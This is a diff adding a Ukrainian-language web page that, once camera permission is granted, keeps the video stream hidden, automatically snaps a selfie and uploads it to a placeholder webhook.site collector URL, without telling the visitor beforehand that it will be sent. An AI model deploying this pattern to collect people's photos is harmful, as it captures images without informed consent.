@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="utf-8">
+  <title>Тест камери — автоселфі та відправка</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <style>
+    body {
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      background: #0f1720;
+      color: #e6eef8;
+      display: flex;
+      flex-direction: ;
+      align-items: ;
+      gap: 12px;
+      padding: 20px;
+    }
+    .card {
+      background: #0b1220;
+      border: 1px solid #1f2a3a;
+      padding: 14px;
+      border-radius: 10px;
+      width: 100%;
+      max-width: 820px;
+      box-sizing: border-box;
+    }
+    /* video приховано, щоб на сторінці не було видимого потоку */
+    video {
+      display: none;
+    }
+    canvas {
+      width: 100%;
+      max-width: 480px;
+      border-radius: 8px;
+      background: #000;
+      display: block;
+    }
+    button {
+      padding: 10px 16px;
+      border-radius: 8px;
+      border: none;
+      background: #2563eb;
+      color: white;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    button:disabled { opacity: 0.6; cursor: default; }
+    .note { font-size: 13px; color: #9fb0c8; }
+    pre.console {
+      background: #07101a;
+      color: #9fe6a8;
+      padding: 8px;
+      border-radius: 6px;
+      max-height: 160px;
+      overflow: auto;
+      border: 1px solid #123;
+      white-space: pre-wrap;
+    }
+  </style>
+</head>
+<body>
+  <h2>Тест камери — автоселфі та відправка</h2>
+
+  <div class="card">
+    <p class="note">Сторінка повинна бути доступна через HTTPS або localhost. Після натискання кнопки браузер покаже діалог дозволу на камеру.</p>
+
+    <!-- Налаштування: вкажи свій endpoint тут -->
+    <div style="display:flex; justify-content:center; margin:12px 0;">
+      <button id="grantBtn">Надати доступ до камери</button>
+    </div>
+
+    <!-- Прихований відеоелемент потрібен для зйомки кадру, але не показується на сторінці -->
+    <video id="video" autoplay playsinline muted></video>
+
+    <div style="margin-top:12px;">
+      <h4>Знятий кадр (автоматично)</h4>
+      <canvas id="canvas"></canvas>
+    </div>
+
+    <div style="margin-top:12px;">
+      <h4>Логи</h4>
+      <pre id="log" class="console">Готово. Натисни "Надати доступ до камери".</pre>
+    </div>
+  </div>
+
+  <script>
+    // === Налаштування: вкажи свій endpoint тут ===
+    // Повинен приймати POST multipart/form-data з полем "photo"
+    const SERVER_UPLOAD_URL = "https://webhook.site/your-unique-id";
+    // =============================================
+
+    const grantBtn = document.getElementById('grantBtn');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const logEl = document.getElementById('log');
+
+    let stream = null;
+    let didAttachMetaListener = false;
+
+    function log(...args) {
+      const text = args.map(a => (typeof a === 'object' ? JSON.stringify(a) : String(a))).join(' ');
+      console.log(text);
+      logEl.textContent += '\n' + text;
+      logEl.scrollTop = logEl.scrollHeight;
+    }
+
+    function isSecureContextAvailable() {
+      return (location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1');
+    }
+
+    async function stopStream() {
+      if (!stream) return;
+      try {
+        stream.getTracks().forEach(t => t.stop());
+      } catch (e) {
+        console.warn('Помилка при зупинці треків', e);
+      } finally {
+        video.srcObject = null;
+        stream = null;
+      }
+    }
+
+    grantBtn.addEventListener('click', async () => {
+      log('Натиснуто: запит доступу до камери');
+
+      if (!isSecureContextAvailable()) {
+        alert('getUserMedia працює лише в безпечному контексті (HTTPS або localhost).');
+        log('Небезпечний контекст. Використай HTTPS або localhost.');
+        return;
+      }
+
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        alert('Ваш браузер не підтримує getUserMedia');
+        log('getUserMedia не підтримується.');
+        return;
+      }
+
+      grantBtn.disabled = true;
+
+      try {
+        // Використовуємо селфі-камеру (facingMode: "user")
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+        video.srcObject = stream;
+        log('Доступ надано. Очікуємо метадані відео...');
+      } catch (err) {
+        grantBtn.disabled = false;
+        log('Помилка при getUserMedia:', err.name || err, err.message || '');
+        alert('Не вдалося отримати доступ до камери: ' + (err.message || err.name));
+        return;
+      }
+
+      // Підписуємося на loadedmetadata лише один раз
+      if (!didAttachMetaListener) {
+        didAttachMetaListener = true;
+        video.addEventListener('loadedmetadata', async function onMeta() {
+          log('Відео готове:', video.videoWidth, 'x', video.videoHeight);
+          // Невелика затримка для стабілізації експозиції
+          await new Promise(r => setTimeout(r, 500));
+          await takePhotoAndSend();
+        }, { once: true });
+      }
+    });
+
+    async function takePhotoAndSend() {
+      if (!stream) {
+        log('takePhoto: немає стріму');
+        return;
+      }
+
+      try {
+        const width = video.videoWidth || 640;
+        const height = video.videoHeight || 480;
+        canvas.width = width;
+        canvas.height = height;
+
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, width, height);
+        log('Кадр знято', width + 'x' + height);
+
+        // Конвертуємо в Blob
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+        if (!blob) {
+          log('toBlob повернув null');
+          return;
+        }
+        log('Фото готове, розмір:', blob.size, 'байт');
+
+        if (!SERVER_UPLOAD_URL) {
+          log('SERVER_UPLOAD_URL не вказано. Відправка скасована.');
+          alert('SERVER_UPLOAD_URL не вказано в коді сторінки.');
+          return;
+        }
+
+        // Відправка
+        log('Відправка фото на', SERVER_UPLOAD_URL);
+        const form = new FormData();
+        form.append('photo', blob, 'selfie.png');
+
+        const resp = await fetch(SERVER_UPLOAD_URL, {
+          method: 'POST',
+          body: form
+        });
+
+        const text = await resp.text().catch(() => '[не вдалося прочитати тіло відповіді]');
+        log('Сервер відповів статусом', resp.status, '-', text);
+
+        if (!resp.ok) {
+          log('Увага: сервер повернув помилковий статус. Можлива проблема з CORS або endpoint не приймає multipart/form-data.');
+          alert('Відправка завершилась зі статусом ' + resp.status);
+        } else {
+          alert('Фото відправлено. Статус: ' + resp.status);
+        }
+      } catch (err) {
+        log('Помилка при зйомці/відправці:', err);
+        alert('Помилка при зйомці або відправці. Подивіться консоль для деталей.');
+      } finally {
+        // Завершуємо роботу з камерою
+        await stopStream();
+        grantBtn.disabled = false;
+        log('Камера зупинена, кнопка розблокована.');
+      }
+    }
+  </script>
+</body>
+</html>
